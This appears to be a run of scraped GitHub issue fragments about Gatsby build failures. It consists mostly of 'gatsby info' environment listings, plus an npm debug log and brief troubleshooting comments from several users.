system: os: windows 10 10.0.19041 cpu: (12) x64 intel(r) core(tm) i9-8950hk cpu @ 2.90ghz binaries: node: 12.16.3 - c:\\program files\ odejs\ ode.exe npm: 6.14.5 - c:\\program files\ odejs\ pm.cmd languages: python: 3.8.3 - c:\\python38\\python.exe browsers: chrome: 86.0.4240.75 edge: spartan (44.19041.423.0), chromium (86.0.622.48) npmpackages: gatsby: ^2.24.79 => 2.24.79
system: os: macos 10.15.7 cpu: (12) x64 intel(r) core(tm) i7-8850h cpu @ 2.60ghz shell: 5.8 - /usr/local/bin/zsh binaries: node: 14.13.1 - ~/.nvm/versions/node/v14.13.1/bin/node npm: 6.14.8 - ~/.nvm/versions/node/v14.13.1/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 86.0.4240.80 firefox: 81.0.2 safari: 14.0 npmpackages: gatsby: ^2.24.73 => 2.24.73 gatsby-image: ^2.4.21 => 2.4.21 gatsby-plugin-intl: ^0.3.3 => 0.3.3 gatsby-plugin-manifest: ^2.4.34 => 2.4.34 gatsby-plugin-offline: ^3.2.31 => 3.2.31 gatsby-plugin-react-helmet: ^3.3.14 => 3.3.14 gatsby-plugin-sharp: ^2.6.40 => 2.6.40 gatsby-plugin-styled-components: ^3.3.14 => 3.3.14 gatsby-plugin-ts-config: ^1.1.0 => 1.1.0 gatsby-plugin-typescript: ^2.4.21 => 2.4.21 gatsby-source-contentstack: ^2.2.11 => 2.2.11 gatsby-source-filesystem: ^2.3.34 => 2.3.34 gatsby-transformer-sharp: ^2.5.17 => 2.5.17
using visual studio code
error #11321 plugin "gatsby-source-shopify" threw an error while running the sourcenodes lifecycle: cannot read property \'includes\' of undefined 41 | shopifyqueries = {} 42 | }) => {
> 43 | const client = (0, _createclient.createclient)(shopname, accesstoken, apiversion); | ^ 44 | const defaultqueries = { 45 | articles: _queries.articles_query, 46 | blogs: _queries.blogs_query, file: node_modules\\gatsby-source-shopify\\gatsby-node.js:43:49
> schwayweb@0.1.0 info /users/austin/projects/schwayweb
> gatsby info --clipboard the above error occurred in the <storestateprovider> component: in storestateprovider in app react will try to recreate this component tree from scratch using the error boundary you provided, app.
warning: app: error boundaries should implement getderivedstatefromerror()
in that method, return a state update to display an error message or fallback ui.
npm err! code elifecycle
npm err! errno 1
npm err! schwayweb@0.1.0 info: `gatsby info --clipboard`
npm err! exit status 1
npm err! npm err! failed at the schwayweb@0.1.0 info script.
npm err! this is probably not a problem with npm
there is likely additional logging output above
npm err! a complete log of this run can be found in:
npm err! /users/austin/.npm/_logs/2020-10-21t18_11_00_179z-debug.log
0 info it worked if it ends with ok
1 verbose cli [
1 verbose cli '/users/austin/.nvm/versions/node/v12.19.0/bin/node',
1 verbose cli '/users/austin/.nvm/versions/node/v12.19.0/bin/npm',
1 verbose cli 'run',
1 verbose cli 'info'
1 verbose cli ]
2 info using npm@6.14.8
3 info using node@v12.19.0
4 verbose run-script [ 'preinfo', 'info', 'postinfo' ]
5 info lifecycle schwayweb@0.1.0~preinfo: schwayweb@0.1.0
6 info lifecycle schwayweb@0.1.0~info: schwayweb@0.1.0
7 verbose lifecycle schwayweb@0.1.0~info: unsafe-perm in lifecycle true
8 verbose lifecycle schwayweb@0.1.0~info: path: /users/austin/.nvm/versions/node/v12.19.0/lib/node_modules/npm/node_modules/npm-lifecycle/node-gyp-bin:/users/austin/projects/schwayweb/node_modules/.bin:/users/austin/.nvm/versions/node/v12.19.0/bin:/users/austin/google-cloud-sdk/bin:/users/austin/.cargo/bin:/users/austin/.rbenv/shims:/users/austin/.rbenv/bin:/users/austin/.composer/vendor/bin:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/git/bin:/users/austin/.rvm/bin
9 verbose lifecycle schwayweb@0.1.0~info: cwd: /users/austin/projects/schwayweb
10 silly lifecycle schwayweb@0.1.0~info: args: [ '-c', 'gatsby info --clipboard' ]
11 silly lifecycle schwayweb@0.1.0~info: returned: code: 1 signal: null
12 info lifecycle schwayweb@0.1.0~info: failed to exec info script
13 verbose stack error: schwayweb@0.1.0 info: `gatsby info --clipboard`
13 verbose stack exit status 1
13 verbose stack at eventemitter.<anonymous> (/users/austin/.nvm/versions/node/v12.19.0/lib/node_modules/npm/node_modules/npm-lifecycle/index.js:332:16)
13 verbose stack at eventemitter.emit (events.js:314:20)
13 verbose stack at childprocess.<anonymous> (/users/austin/.nvm/versions/node/v12.19.0/lib/node_modules/npm/node_modules/npm-lifecycle/lib/spawn.js:55:14)
13 verbose stack at childprocess.emit (events.js:314:20)
13 verbose stack at maybeclose (internal/child_process.js:1021:16)
13 verbose stack at process.childprocess._handle.onexit (internal/child_process.js:286:5)
14 verbose pkgid schwayweb@0.1.0
15 verbose cwd /users/austin/projects/schwayweb
16 verbose darwin 19.6.0
17 verbose argv "/users/austin/.nvm/versions/node/v12.19.0/bin/node" "/users/austin/.nvm/versions/node/v12.19.0/bin/npm" "run" "info"
18 verbose node v12.19.0
19 verbose npm v6.14.8
20 error code elifecycle
21 error errno 1
22 error schwayweb@0.1.0 info: `gatsby info --clipboard`
22 error exit status 1
23 error failed at the schwayweb@0.1.0 info script.
23 error this is probably not a problem with npm
there is likely additional logging output above.
24 verbose exit [ 1, true ]
``` npm version: 6.14.8
node version: 12.19.0
gatsby version: 2.24.84
system: os: windows 10 10.0.18362 cpu: (12) x64 intel(r) core(tm) i7-5930k cpu @ 3.50ghz binaries: node: 12.17.0 - c:\\program files (x86)\ odejs\ ode.exe yarn: 1.22.4 - ~\\appdata\ oaming\ pm\\yarn.cmd npm: 6.14.7 - ~\\appdata\ oaming\ pm\ pm.cmd languages: python: 3.7.0 - /usr/bin/python browsers: chrome: 86.0.4240.75 edge: spartan (44.18362.449.0) npmpackages: gatsby: ^2.24.79 => 2.24.79 gatsby-image: ^2.4.21 => 2.4.21 gatsby-plugin-manifest: ^2.4.34 => 2.4.34 gatsby-plugin-offline: ^3.2.33 => 3.2.33 gatsby-plugin-react-helmet: ^3.3.14 => 3.3.14 gatsby-plugin-sharp: ^2.6.42 => 2.6.42 gatsby-source-filesystem: ^2.3.34 => 2.3.34 gatsby-transformer-sharp: ^2.5.17 => 2.5.17 npmglobalpackages: gatsby-cli: 2.12.111
system: os: macos 10.15.7 cpu: (16) x64 intel(r) core(tm) i9-9980hk cpu @ 2.40ghz shell: 5.0.11 - /usr/local/bin/bash binaries: node: 12.18.4 - ~/.nvm/versions/node/v12.18.4/bin/node npm: 6.14.6 - ~/.nvm/versions/node/v12.18.4/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 86.0.4240.80 firefox: 80.0 safari: 14.0 npmpackages: gatsby: ^2.24.83 => 2.24.83 gatsby-image: ^2.4.21 => 2.4.21 gatsby-link: ^2.4.16 => 2.4.16 gatsby-plugin-canonical-urls: ^2.3.13 => 2.3.13 gatsby-plugin-create-client-paths: ^2.3.13 => 2.3.13 gatsby-plugin-emotion: ^4.3.14 => 4.3.14 gatsby-plugin-feed: ^2.5.17 => 2.5.17 gatsby-plugin-google-analytics: ^2.3.19 => 2.3.19 gatsby-plugin-manifest: ^2.4.35 => 2.4.35 gatsby-plugin-offline: ^3.2.35 => 3.2.35 gatsby-plugin-optimize-svgs: ^1.0.3 => 1.0.4 gatsby-plugin-react-helmet: ^3.3.14 => 3.3.14 gatsby-plugin-react-svg: ^3.0.0 => 3.0.0 gatsby-plugin-remove-trailing-slashes: ^2.3.13 => 2.3.13 gatsby-plugin-s3: ^0.3.5 => 0.3.5 gatsby-plugin-sharp: ^2.6.43 => 2.6.43 gatsby-plugin-sitemap: ^2.4.17 => 2.4.17 gatsby-plugin-twitter: ^2.3.12 => 2.3.12 gatsby-plugin-typescript: ^2.4.23 => 2.4.23 gatsby-plugin-typography: ^2.5.13 => 2.5.13 gatsby-react-router-scroll: ^3.0.15 => 3.0.15 gatsby-remark-autolink-headers: ^2.3.15 => 2.3.15 gatsby-remark-copy-linked-files: ^2.3.19 => 2.3.19 gatsby-remark-embed-video: ^3.0.10 => 3.0.10 gatsby-remark-embedder: ^3.0.0 => 3.0.0 gatsby-remark-images: ^3.3.37 => 3.3.37 gatsby-remark-prismjs: ^3.5.16 => 3.5.16 gatsby-remark-responsive-iframe: ^2.4.17 => 2.4.17 gatsby-remark-smartypants: ^2.3.13 => 2.3.13 gatsby-source-filesystem: ^2.3.35 => 2.3.35 gatsby-source-graphql: ^2.7.6 => 2.7.6 gatsby-transformer-remark: ^2.8.44 => 2.8.44 gatsby-transformer-sharp: ^2.5.19 => 2.5.19
system: os: macos 10.15.6 cpu: (8) x64 intel(r) core(tm) i7-7700hq cpu @ 2.80ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.18.3 - /usr/local/bin/node yarn: 1.22.5 - ~/.yarn/bin/yarn npm: 6.14.8 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 86.0.4240.80 firefox: 79.0 safari: 13.1.2 npmpackages: gatsby: ^2.24.41 => 2.24.82 gatsby-cli: ^2.12.92 => 2.12.110 gatsby-image: ^2.4.15 => 2.4.21 gatsby-plugin-manifest: ^2.4.22 => 2.4.35 gatsby-plugin-offline: ^3.2.23 => 3.2.34 gatsby-plugin-react-helmet: ^3.3.10 => 3.3.14 gatsby-plugin-sass: ^2.3.17 => 2.3.18 gatsby-plugin-sharp: ^2.6.26 => 2.6.43 gatsby-plugin-typescript: ^2.4.22 => 2.4.22 gatsby-source-filesystem: ^2.3.24 => 2.3.35 gatsby-source-sanity: ^6.0.3 => 6.0.4 gatsby-transformer-sharp: ^2.5.12 => 2.5.18 npmglobalpackages: gatsby-cli: 2.12.110
system: os: linux 4.19 alpine linux cpu: (6) x64 intel(r) core(tm) i5-9400f cpu @ 2.90ghz shell: 1.31.1 - /bin/ash binaries: node: 12.19.0 - /tmp/yarn--1603158967196-0.15230267289026678/node yarn: 1.22.5 - /tmp/yarn--1603158967196-0.15230267289026678/yarn npm: 6.14.8 - /usr/local/bin/npm npmpackages: gatsby: ^2.24.63 => 2.24.82 gatsby-image: ^2.4.19 => 2.4.21 gatsby-plugin-feed: ^2.5.12 => 2.5.16 gatsby-plugin-google-analytics: ^2.3.14 => 2.3.19 gatsby-plugin-manifest: ^2.4.30 => 2.4.35 gatsby-plugin-offline: ^3.2.28 => 3.2.34 gatsby-plugin-react-helmet: ^3.3.11 => 3.3.14 gatsby-plugin-sharp: ^2.6.36 => 2.6.43 gatsby-remark-copy-linked-files: ^2.3.15 => 2.3.19 gatsby-remark-images: ^3.3.30 => 3.3.36 gatsby-remark-prismjs: ^3.5.13 => 3.5.16 gatsby-remark-responsive-iframe: ^2.4.14 => 2.4.17 gatsby-remark-smartypants: ^2.3.11 => 2.3.13 gatsby-source-filesystem: ^2.3.30 => 2.3.35 gatsby-transformer-remark: ^2.8.35 => 2.8.43 gatsby-transformer-sharp: ^2.5.15 => 2.5.18 npmglobalpackages: gatsby-cli: 2.12.110
system: os: linux 5.4 ubuntu 20.04.1 lts (focal fossa) cpu: (4) x64 intel(r) core(tm) i5-7400 cpu @ 3.00ghz shell: 5.8 - /usr/bin/zsh binaries: node: 12.18.3 - ~/.nvm/versions/node/v12.18.3/bin/node npm: 6.14.6 - ~/.nvm/versions/node/v12.18.3/bin/npm browsers: chrome: 85.0.4183.102 firefox: 81.0 npmpackages: gatsby: ^2.24.76 => 2.24.76 gatsby-image: ^2.4.21 => 2.4.21 gatsby-plugin-client-side-redirect: ^1.1.0 => 1.1.0 gatsby-plugin-emotion: ^4.3.13 => 4.3.13 gatsby-plugin-google-analytics: ^2.3.18 => 2.3.18 gatsby-plugin-manifest: ^2.4.34 => 2.4.34 gatsby-plugin-netlify: ^2.3.17 => 2.3.17 gatsby-plugin-offline: ^3.2.31 => 3.2.31 gatsby-plugin-react-helmet: ^3.3.14 => 3.3.14 gatsby-plugin-remove-fingerprints: 0.0.2 => 0.0.2 gatsby-plugin-remove-trailing-slashes: ^2.3.13 => 2.3.13 gatsby-plugin-sharp: ^2.6.42 => 2.6.42 gatsby-source-shopify: ^3.2.36 => 3.2.36 gatsby-source-strapi: 0.0.12 => 0.0.12 gatsby-transformer-sharp: ^2.5.17 => 2.5.17 npmglobalpackages: gatsby-cli: 2.12.87
v14.14.0 npm -v
6.14.8 gatsby cli version: 2.12.109
we currently have the [netlify-plugin-gatsby-cache]( installed in our netlify env
we also enabled the incremental build in netlify using this command
``gatsby_experimental_page_build_on_data_changes=true gatsby build `` ``` system: os: linux 5.4 ubuntu 20.04.1 lts (focal fossa) cpu: (8) x64 intel(r) core(tm) i7-4810mq cpu @ 2.80ghz shell: 5.0.17 - /bin/bash binaries: node: 14.2.0 - ~/.nvm/versions/node/v14.2.0/bin/node yarn: 1.21.1 - /usr/bin/yarn npm: 6.14.4 - ~/.nvm/versions/node/v14.2.0/bin/npm languages: python: 2.7.18 - /usr/bin/python browsers: chrome: 86.0.4240.75 firefox: 81.0.2 npmpackages: gatsby: ^2.21.37 => 2.21.37 gatsby-background-image: ^1.1.2 => 1.1.2 gatsby-image: ^2.4.16 => 2.4.16 gatsby-plugin-google-analytics: ^2.3.14 => 2.3.14 gatsby-plugin-manifest: ^2.4.5 => 2.4.5 gatsby-plugin-netlify: ^2.3.10 => 2.3.10 gatsby-plugin-nprogress: ^2.3.11 => 2.3.11 gatsby-plugin-offline: ^3.2.3 => 3.2.3 gatsby-plugin-react-helmet: ^3.3.1 => 3.3.1 gatsby-plugin-root-import: ^2.0.5 => 2.0.5 gatsby-plugin-sass: ^2.3.2 => 2.3.3 gatsby-plugin-sentry: ^1.0.1 => 1.0.1 gatsby-plugin-sharp: ^2.6.27 => 2.6.27 gatsby-source-contentful: ^2.3.55 => 2.3.55 gatsby-source-filesystem: ^2.3.4 => 2.3.4 gatsby-source-graphql: ^2.7.6 => 2.7.6 gatsby-transformer-remark: ^2.8.28 => 2.8.28 gatsby-transformer-sharp: ^2.5.13 => 2.5.13
system: os: macos mojave 10.14.6 cpu: (12) x64 intel(r) core(tm) i7-8850h cpu @ 2.60ghz shell: 3.1.2 - /usr/local/bin/fish binaries: node: 12.18.3 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.7 - /usr/local/bin/npm languages: python: 3.7.7 - /opt/anaconda3/bin/python browsers: chrome: 86.0.4240.80 firefox: 80.0.1 safari: 12.1.2 npmpackages: gatsby: ^2.24.66 => 2.24.66 gatsby-background-image: ^1.1.2 => 1.1.2 gatsby-image: ^2.4.21 => 2.4.21 gatsby-plugin-google-fonts: ^1.0.1 => 1.0.1 gatsby-plugin-postcss: ^3.0.1 => 3.0.1 gatsby-plugin-sharp: ^2.6.40 => 2.6.42 gatsby-source-filesystem: ^2.3.34 => 2.3.34 gatsby-source-sanity: ^6.0.4 => 6.0.4 gatsby-transformer-json: ^2.4.14 => 2.4.14 gatsby-transformer-sharp: ^2.5.17 => 2.5.17 npmglobalpackages: gatsby-cli: 2.12.65
system: os: windows 10 10.0.19041 cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz binaries: node: 10.13.0 - c:\\program files\ odejs\ ode.exe npm: 6.4.1 - c:\\program files\ odejs\ pm.cmd browsers: chrome: 86.0.4240.75 edge: spartan (44.19041.423.0), chromium (86.0.622.38) npmpackages: gatsby: ^1.9.279 => 1.9.279 gatsby-image: ^1.0.55 => 1.0.55 gatsby-link: ^1.6.46 => 1.6.46 gatsby-plugin-react-helmet: ^1.0.8 => 1.0.8 gatsby-plugin-sharp: ^1.6.46 => 1.6.48 gatsby-source-contentful: ^1.3.54 => 1.3.54 gatsby-transformer-remark: ^1.7.44 => 1.7.44 npmglobalpackages: gatsby: 2.24.53 ### commentary 1st i thought it might be this behind it: #compatibility-with-react-168-useeffect-hook
- but the project uses react 15.x
2nd i thought it might be this: #issuecomment-477463165
- no content has been removed on contentful ..
it is a mystery
how can i find out what the hell is going on? if this is an offending, failing graphql query, how do i troubleshoot if i cannot even get graphiql locally?
``` system: os: macos 10.15.5 cpu: (8) x64 intel(r) core(tm) i7-7820hq cpu @ 2.90ghz shell: 3.1.2 - /usr/local/bin/fish binaries: node: 12.16.2 - /var/folders/c4/mhc54hmd0f737mhbsl_zzgtc0000gn/t/yarn--1602932447307-0.3107886905787032/node yarn: 1.22.4 - /var/folders/c4/mhc54hmd0f737mhbsl_zzgtc0000gn/t/yarn--1602932447307-0.3107886905787032/yarn npm: 6.14.4 - ~/.nvm/versions/node/v12.16.2/bin/npm languages: python: 2.7.16 - /users/ross/.pyenv/shims/python browsers: chrome: 86.0.4240.80 firefox: 81.0.1 safari: 13.1.1 npmpackages: gatsby: ^2.24.63 => 2.24.63 gatsby-cli: ^2.12.99 => 2.12.99 gatsby-plugin-create-client-paths: ^2.3.11 => 2.3.11 gatsby-plugin-eslint: ^2.0.8 => 2.0.8 gatsby-plugin-goatcounter: ^0.4.0 => 0.4.0 gatsby-plugin-layout: ^1.3.11 => 1.3.11 gatsby-plugin-material-ui: ^2.1.9 => 2.1.10 gatsby-plugin-react-helmet: ^3.3.11 => 3.3.11 gatsby-plugin-why-did-you-render: ^2.0.0 => 2.0.0 gatsby-source-filesystem: ^2.3.30 => 2.3.30 gatsby-transformer-csv: ^2.3.13 => 2.3.13 ```
system: os: windows 10 10.0.17134 cpu: (8) x64 intel(r) core(tm) i7-6700k cpu @ 4.00ghz binaries: node: 12.18.4 - c:\\program files\ odejs\ ode.exe npm: 6.14.8 - c:\\program files\ odejs\ pm.cmd browsers: chrome: 86.0.4240.75 edge: spartan (42.17134.1.0) npmpackages: gatsby: ^2.24.79 => 2.24.79 gatsby-plugin-styled-components: ^3.3.14 => 3.3.14 npmglobalpackages: gatsby-cli: 2.12.101
system: os: windows 10 10.0.17763 cpu: (8) x64 intel(r) core(tm) i7-2700k cpu @ 3.50ghz binaries: node: 12.10.0 - c:\\program files\ odejs\ ode.exe yarn: 1.22.0 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.10.3 - c:\\program files\ odejs\ pm.cmd languages: python: 3.8.5 browsers: edge: 44.17763.1.0 npmpackages: gatsby: ^2.21.13 => 2.21.13 gatsby-image: ^2.4.1 => 2.4.1 gatsby-plugin-manifest: ^2.4.2 => 2.4.2 gatsby-plugin-offline: ^3.2.1 => 3.2.1 gatsby-plugin-preact: ^4.0.0 => 4.0.0 gatsby-plugin-react-helmet: ^3.3.1 => 3.3.1 gatsby-plugin-remote-images: ^2.2.0 => 2.2.0 gatsby-plugin-sharp: ^2.6.1 => 2.6.1 gatsby-plugin-sitemap: ^2.4.16 => 2.4.16 gatsby-plugin-webpack-bundle-analyser-v2: ^1.1.9 => 1.1.9 gatsby-source-custom-api: ^2.1.4 => 2.1.4 gatsby-source-filesystem: ^2.3.1 => 2.3.1 gatsby-source-multi-api: ^1.0.3 => 1.0.3 gatsby-source-rest-api: ^0.2.3 => 0.2.3 gatsby-transformer-sharp: ^2.5.1 => 2.5.1 npmglobalpackages: gatsby-cli: 2.12.13 @pearce-ropion
``` system: os: macos 10.15.7 cpu: (16) x64 intel(r) core(tm) i9-9980hk cpu @ 2.40ghz shell: 3.2.57 - /bin/bash binaries: node: 12.19.0 - /usr/local/bin/node yarn: 1.13.0 - /usr/local/bin/yarn npm: 6.14.8 - /usr/local/bin/npm languages: python: 2.7.15 - /usr/local/bin/python browsers: chrome: 86.0.4240.80 edge: 83.0.478.54 firefox: 80.0.1 safari: 14.0 npmglobalpackages: gatsby-cli: 2.12.107 gatsby: 2.24.77 ```
``` system: os: linux 4.15 ubuntu 18.04.5 lts (bionic beaver) cpu: (4) x64 intel(r) core(tm) i7-7500u cpu @ 2.70ghz shell: 4.4.20 - /bin/bash binaries: node: 14.5.0 - ~/.nvm/versions/node/v14.5.0/bin/node yarn: 1.19.0 - ~/.yarn/bin/yarn npm: 6.14.5 - ~/.nvm/versions/node/v14.5.0/bin/npm languages: python: 2.7.17 - /usr/bin/python browsers: chrome: 86.0.4240.75 firefox: 81.0
``` system: os: macos 10.15.7 cpu: (16) x64 intel(r) core(tm) i9-9880h cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 13.11.0 - ~/.nvm/versions/node/v13.11.0/bin/node yarn: 1.22.10 - /usr/local/bin/yarn npm: 6.14.8 - ~/.nvm/versions/node/v13.11.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 86.0.4240.80 safari: 14.0 npmpackages: gatsby: ^2.24.77 => 2.24.77 gatsby-image: ^2.4.21 => 2.4.21 gatsby-plugin-canonical-urls: ^2.3.13 => 2.3.13 gatsby-plugin-catch-links: ^2.3.15 => 2.3.15 gatsby-plugin-eslint: ^2.0.8 => 2.0.8 gatsby-plugin-feed: ^2.5.14 => 2.5.14 gatsby-plugin-google-analytics: ^2.3.18 => 2.3.18 gatsby-plugin-google-tagmanager: ^2.3.16 => 2.3.16 gatsby-plugin-manifest: ^2.4.34 => 2.4.34 gatsby-plugin-netlify: ^2.3.18 => 2.3.18 gatsby-plugin-nprogress: ^2.3.13 => 2.3.13 gatsby-plugin-offline: ^3.2.31 => 3.2.31 gatsby-plugin-react-helmet: ^3.3.14 => 3.3.14 gatsby-plugin-robots-txt: ^1.5.3 => 1.5.3 gatsby-plugin-sass: ^2.3.16 => 2.3.16 gatsby-plugin-sharp: ^2.6.42 => 2.6.42 gatsby-plugin-sitemap: ^2.4.16 => 2.4.16 gatsby-plugin-smoothscroll: ^1.2.0 => 1.2.0 gatsby-remark-embedder: ^3.0.0 => 3.0.0 gatsby-remark-images: ^3.3.33 => 3.3.33 gatsby-remark-images-contentful: ^2.3.19 => 2.3.19 gatsby-remark-relative-images: ^2.0.2 => 2.0.2 gatsby-source-contentful: ^2.3.52 => 2.3.52 gatsby-source-filesystem: ^2.3.34 => 2.3.34 gatsby-transformer-remark: ^2.8.39 => 2.8.39 gatsby-transformer-sharp: ^2.5.17 => 2.5.17 npmglobalpackages: gatsby-cli: 2.12.101
``` system: os: macos mojave 10.14.6 cpu: (12) x64 intel(r) core(tm) i9-8950hk cpu @ 2.90ghz shell: 3.2.57 - /bin/sh binaries: node: 12.16.3 - ~/.nvm/versions/node/v12.16.3/bin/node yarn: 1.22.10 - /usr/local/bin/yarn npm: 6.14.4 - ~/.nvm/versions/node/v12.16.3/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 86.0.4240.80 firefox: 81.0.1 safari: 14.0 npmpackages: gatsby: ^2.24.76 => 2.24.76 gatsby-cli: ^2.12.107 => 2.12.107 gatsby-image: ^2.4.21 => 2.4.21 gatsby-link: ^2.4.15 => 2.4.15 gatsby-plugin-catch-links: ^2.3.15 => 2.3.15 gatsby-plugin-favicon: ^3.1.6 => 3.1.6 gatsby-plugin-google-tagmanager: ^2.3.15 => 2.3.15 gatsby-plugin-manifest: ^2.4.34 => 2.4.34 gatsby-plugin-netlify-cms: ^4.3.16 => 4.3.16 gatsby-plugin-node-fields: 3.1.0 => 3.1.0 gatsby-plugin-page-creator: ^2.3.32 => 2.3.32 gatsby-plugin-react-helmet: ^3.3.14 => 3.3.14 gatsby-plugin-react-helmet-canonical-urls: ^1.4.0 => 1.4.0 gatsby-plugin-scroll-reveal: ^0.0.7 => 0.0.7 gatsby-plugin-sharp: ^2.6.42 => 2.6.42 gatsby-plugin-sitemap: ^2.4.16 => 2.4.16 gatsby-plugin-styled-components: ^3.3.14 => 3.3.14 gatsby-plugin-svgr: ^2.0.2 => 2.0.2 gatsby-react-router-scroll: 3.0.14 => 3.0.14 gatsby-remark-autolink-headers: ^2.3.15 => 2.3.15 gatsby-remark-component-parent2div: ^1.2.3 => 1.2.3 gatsby-remark-copy-linked-files: ^2.3.19 => 2.3.19 gatsby-remark-footnotes: ^0.0.7 => 0.0.7 gatsby-remark-images: ^3.3.33 => 3.3.33 gatsby-remark-numbered-footnotes: ^1.0.1 => 1.0.1 gatsby-remark-relative-images: ^2.0.2 => 2.0.2 gatsby-remark-responsive-iframe: ^2.4.17 => 2.4.17 gatsby-remark-smartypants: ^2.3.13 => 2.3.13 gatsby-remark-unwrap-images: ^1.0.2 => 1.0.2 gatsby-source-filesystem: ^2.3.34 => 2.3.34 gatsby-transformer-json: ^2.4.14 => 2.4.14 gatsby-transformer-remark: ^2.8.38 => 2.8.38 gatsby-transformer-sharp: ^2.5.17 => 2.5.17
``` system: os: linux 5.8 arch linux cpu: (16) x64 amd ryzen 7 3800x 8-core processor shell: 5.8 - /usr/bin/zsh binaries: node: 12.18.3 - /tmp/yarn--1602600057219-0.43846647488335666/node yarn: 1.22.10 - /tmp/yarn--1602600057219-0.43846647488335666/yarn npm: 6.14.6 - ~/.nvm/versions/node/v12.18.3/bin/npm languages: python: 3.8.6 - /usr/bin/python browsers: firefox: 81.0.1 npmpackages: gatsby: ^2.24.76 => 2.24.76 gatsby-plugin-canonical-urls: ^2.3.13 => 2.3.13 gatsby-plugin-create-client-paths: ^2.3.13 => 2.3.13 gatsby-plugin-layout: ^1.3.13 => 1.3.13 gatsby-plugin-manifest: ^2.4.34 => 2.4.34 gatsby-plugin-offline: ^3.2.31 => 3.2.31 gatsby-plugin-react-helmet-async: ^1.1.0 => 1.1.0 gatsby-plugin-react-redux: ^1.1.0 => 1.1.0 gatsby-plugin-robots-txt: ^1.5.3 => 1.5.3 gatsby-plugin-s3: ^0.3.5 => 0.3.5 gatsby-plugin-sitemap: ^2.4.16 => 2.4.16 gatsby-plugin-styled-components: ^3.3.14 => 3.3.14 gatsby-plugin-ts-config: ^1.1.0 => 1.1.0 gatsby-plugin-typescript: ^2.4.21 => 2.4.21 gatsby-plugin-typescript-checker: ^1.1.1 => 1.1.1 gatsby-plugin-webpack-bundle-analyser-v2: ^1.1.13 => 1.1.13
i'm going to redact some of this information because i don't think it's relevant and it could be used for device fingerprinting
``` system: os: macos mojave 10.14.6 shell: 3.2.57 - /bin/bash binaries: node: 14.13.0 - ~/.nvm/versions/node/v14.13.0/bin/node npm: 6.14.8 - ~/.nvm/versions/node/v14.13.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: npmpackages: gatsby: ^2.24.67 => 2.24.67 gatsby-plugin-postcss: ^3.0.1 => 3.0.1
system: os: linux 5.4 ubuntu 20.04.1 lts (focal fossa) cpu: (4) x64 intel(r) core(tm) i5-5200u cpu @ 2.20ghz shell: 3.1.0 - /usr/bin/fish binaries: node: 12.16.0 - /usr/local/bin/node npm: 6.14.8 - /usr/local/bin/npm languages: python: 3.8.5 - /usr/bin/python browsers: chrome: 86.0.4240.75 firefox: 81.0 npmpackages: gatsby: ^2.23.3 => 2.23.3 gatsby-image: ^2.4.9 => 2.4.9 gatsby-plugin-canonical-urls: ^2.3.12 => 2.3.12 gatsby-plugin-disqus: ^1.2.2 => 1.2.2 gatsby-plugin-feed: ^2.5.13 => 2.5.13 gatsby-plugin-firebase: ^0.2.0-beta.4 => 0.2.0-beta.4 gatsby-plugin-google-fonts: ^1.0.1 => 1.0.1 gatsby-plugin-mailchimp: ^5.2.2 => 5.2.2 gatsby-plugin-mdx: ^1.2.15 => 1.2.15 gatsby-plugin-offline: ^3.2.31 => 3.2.31 gatsby-plugin-react-helmet: ^3.3.6 => 3.3.6 gatsby-plugin-robots-txt: ^1.5.3 => 1.5.3 gatsby-plugin-sharp: ^2.6.11 => 2.6.11 gatsby-plugin-sitemap: ^2.4.14 => 2.4.14 gatsby-plugin-styled-components: ^3.3.4 => 3.3.4 gatsby-remark-copy-linked-files: ^2.3.7 => 2.3.7 gatsby-remark-images: ^3.3.10 => 3.3.10 gatsby-source-filesystem: ^2.3.11 => 2.3.11 gatsby-transformer-sharp: ^2.5.5 => 2.5.5 npmglobalpackages: gatsby-cli: 2.12.45
system: os: macos 10.15.7 cpu: (12) x64 intel(r) core(tm) i9-8950hk cpu @ 2.90ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.13.1 - /usr/local/bin/node yarn: 1.22.10 - /usr/local/bin/yarn npm: 6.14.8 - /usr/local/bin/npm languages: python: 3.7.6 - /opt/anaconda3/bin/python browsers: chrome: 86.0.4240.75 safari: 14.0 npmpackages: gatsby: ^2.24.73 => 2.24.74 gatsby-image: ^2.4.21 => 2.4.21 gatsby-plugin-fontawesome-css: ^1.0.0 => 1.0.0 gatsby-plugin-google-fonts: ^1.0.1 => 1.0.1 gatsby-plugin-manifest: ^2.4.34 => 2.4.34 gatsby-plugin-offline: ^3.2.31 => 3.2.31 gatsby-plugin-react-helmet: ^3.3.14 => 3.3.14 gatsby-plugin-react-svg: ^3.0.0 => 3.0.0 gatsby-plugin-sharp: ^2.6.40 => 2.6.41 gatsby-plugin-styled-components: ^3.3.14 => 3.3.14 gatsby-source-filesystem: ^2.3.34 => 2.3.34 gatsby-transformer-sharp: ^2.5.17 => 2.5.17 npmglobalpackages: gatsby-cli: 2.12.107 thanks for your help
system: os: windows 10 10.0.18362 cpu: (12) x64 intel(r) core(tm) i7-9750h cpu @ 2.60ghz binaries: node: 10.16.0 - c:\\program files\ odejs\ ode.exe yarn: 1.13.0 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.9.0 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.14 browsers: chrome: 85.0.4183.121 edge: spartan (44.18362.449.0) npmpackages: gatsby: ^2.24.63 => 2.24.73 gatsby-image: ^2.4.19 => 2.4.21 gatsby-plugin-netlify: ^2.3.15 => 2.3.17 gatsby-source-filesystem: ^2.3.30 => 2.3.34 gatsby-source-graphql: ^2.7.4 => 2.7.6 gatsby-transformer-sharp: ^2.5.15 => 2.5.17 npmglobalpackages: gatsby-cli: 2.12.100
